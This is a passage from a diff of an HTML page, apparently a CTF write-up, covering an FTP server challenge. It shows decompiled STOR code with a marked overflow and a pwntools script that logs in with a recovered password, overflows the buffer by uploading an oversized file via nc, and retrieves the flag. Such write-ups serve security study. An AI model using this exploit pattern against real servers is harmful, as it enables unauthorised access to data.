@@ -473,71 +473,70 @@ trying size: 6
 </code></pre></div></div>
 <p>So apparently we can’t have <code class="highlighter-rouge">'f'</code> in our filename, we’ll need to find another way to bypass the filter. By checking other functions, I finally found a way to bypass it.</p>
 
-<p>```c STOR function
-sub_4014F8(<em>(_DWORD *)a1, “transfer starting.\n”);
-while ( 1 )
-{
-    v6 = recv(</em>(_DWORD *)(a1 + 4), byte_604200, 0xAuLL, 0);
-    if ( v6 &lt; 0 )
-        break;
-    if ( !v6 )
-        goto LABEL_8;
-    v5 += v6;
-}</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sub_4014F8</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="s">"transfer starting.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">v6</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">),</span> <span class="n">byte_604200</span><span class="p">,</span> <span class="mh">0xAuLL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v6</span> <span class="p">)</span>
+        <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>
+    <span class="n">v5</span> <span class="o">+=</span> <span class="n">v6</span><span class="p">;</span>
+<span class="p">}</span>
 
-<p>sub_4014F8(*(_DWORD *)a1, “error receiving file”);</p>
+<span class="n">sub_4014F8</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="s">"error receiving file"</span><span class="p">);</span>
 
-<p>LABEL_8:
-    printf(“Storing file %s”, <em>(_QWORD *)(a1 + 24));
-    byte_604200[(signed __int64)(signed int)v5] = 0; // overflow vulnerability
-    v3 = dword_604404++;
-    LODWORD(v4) = sub_40139B(v7, v5);
-    qword_604840[v3] = v4;
-    sub_4014F8(</em>(_DWORD *)a1, “transfer complete\n”);
-    result = sub_4023DF(a1, 4207204LL);</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-Here in the `STOR` function, **if we upload a file that is big enough, we can overwrite the data at `0x604408`**. So it's quite simple: just create a file that is larger than 512 bytes, then upload it to the server. After that, we can download the `flag.txt` and get the flag.
+<span class="n">LABEL_8</span><span class="o">:</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Storing file %s"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">24</span><span class="p">));</span>
+    <span class="n">byte_604200</span><span class="p">[(</span><span class="kt">signed</span> <span class="n">__int64</span><span class="p">)(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// overflow vulnerability
+</span>    <span class="n">v3</span> <span class="o">=</span> <span class="n">dword_604404</span><span class="o">++</span><span class="p">;</span>
+    <span class="n">LODWORD</span><span class="p">(</span><span class="n">v4</span><span class="p">)</span> <span class="o">=</span> <span class="n">sub_40139B</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+    <span class="n">qword_604840</span><span class="p">[</span><span class="n">v3</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+    <span class="n">sub_4014F8</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="s">"transfer complete</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">sub_4023DF</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="mi">4207204LL</span><span class="p">);</span>
+</code></pre></div></div>
 
-```python
-#!/usr/bin/env python
+<p>Here in the <code class="highlighter-rouge">STOR</code> function, <strong>if we upload a file that is big enough, we can overwrite the data at <code class="highlighter-rouge">0x604408</code></strong>. So it’s quite simple: just create a file that is larger than 512 bytes, then upload it to the server. After that, we can download the <code class="highlighter-rouge">flag.txt</code> and get the flag.</p>
 
-from pwn import *
-import subprocess
-import sys
-import time
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-#HOST = "localhost"
-HOST = "54.175.183.202"
-PORT = 12012
-ELF_PATH = ""
-LIBC_PATH = ""
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-# setting 
-context.arch = 'amd64'
-#context.arch = 'i386'
-#context.arch = 'arm'
-#context.arch = 'aarch64'
-context.os = 'linux'
-context.endian = 'little'
-context.word_size = 32
-#elf = ELF(ELF_PATH)
-#libc = ELF(LIBC_PATH)
+<span class="c">#HOST = "localhost"</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"54.175.183.202"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">12012</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-def my_recvuntil(s, delim):
-    res = ""
-    while delim not in res:
-        c = s.recv(1)
-        res += c
-        sys.stdout.write(c)
-        sys.stdout.flush()
-    return res
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c">#context.arch = 'i386'</span>
+<span class="c">#context.arch = 'arm'</span>
+<span class="c">#context.arch = 'aarch64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="c">#elf = ELF(ELF_PATH)</span>
+<span class="c">#libc = ELF(LIBC_PATH)</span>
 
-def myexec(cmd):
-    return subprocess.check_output(cmd, shell=True)
+<span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">res</span>
 
-if __name__ == "__main__":
+<span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
-    """
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+
+    <span class="s">"""
     solved by z3
     trying size: 6
     86
@@ -546,31 +545,31 @@ if __name__ == "__main__":
     119
     116
     88
-    """
-    password = [86, 41, 66, 119, 116, 88]
-    password = ''.join(chr(c) for c in password)
+    """</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="p">[</span><span class="mi">86</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">88</span><span class="p">]</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">password</span><span class="p">)</span>
 
-    r = remote(HOST, PORT)
-    #r = process(ELF_PATH)
-    r.sendlineafter("server\n", "USER blankwall")
-    r.sendafter("blankwall\n", "PASS "+password)
-    r.recvuntil("in\n")
-    log.success("login success")
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = process(ELF_PATH)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"server</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"USER blankwall"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"blankwall</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"PASS "</span><span class="o">+</span><span class="n">password</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"in</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"login success"</span><span class="p">)</span>
 
-    log.info("Sending dildo.txt...") # don't mind the filename LOL!
-    r.sendlinethen("port: ", "PASV")
-    pasv_port = int(r.recvline())
-    r.sendline("STOR dildo.txt")
-    myexec("cat dildo.txt | nc "+HOST+" "+str(pasv_port))
-    r.recvuntil("complete\n")
-    log.success("Send success!")
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Sending dildo.txt..."</span><span class="p">)</span> <span class="c"># don't mind the filename LOL!</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlinethen</span><span class="p">(</span><span class="s">"port: "</span><span class="p">,</span> <span class="s">"PASV"</span><span class="p">)</span>
+    <span class="n">pasv_port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"STOR dildo.txt"</span><span class="p">)</span>
+    <span class="n">myexec</span><span class="p">(</span><span class="s">"cat dildo.txt | nc "</span><span class="o">+</span><span class="n">HOST</span><span class="o">+</span><span class="s">" "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">pasv_port</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"complete</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Send success!"</span><span class="p">)</span>
 
-    log.info("Downloading flag.txt...")
-    r.sendlinethen("port: ", "PASV")
-    pasv_port = int(r.recvline())
-    r.sendline("RETR flag.txt")
-    flag = myexec("nc "+HOST+" "+str(pasv_port))
-    log.success("Get flag: "+flag)
+    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Downloading flag.txt..."</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlinethen</span><span class="p">(</span><span class="s">"port: "</span><span class="p">,</span> <span class="s">"PASV"</span><span class="p">)</span>
+    <span class="n">pasv_port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"RETR flag.txt"</span><span class="p">)</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="n">myexec</span><span class="p">(</span><span class="s">"nc "</span><span class="o">+</span><span class="n">HOST</span><span class="o">+</span><span class="s">" "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">pasv_port</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Get flag: "</span><span class="o">+</span><span class="n">flag</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>The flag is: <code class="highlighter-rouge">flag{exploiting_ftp_servers_in_2015}</code></p>
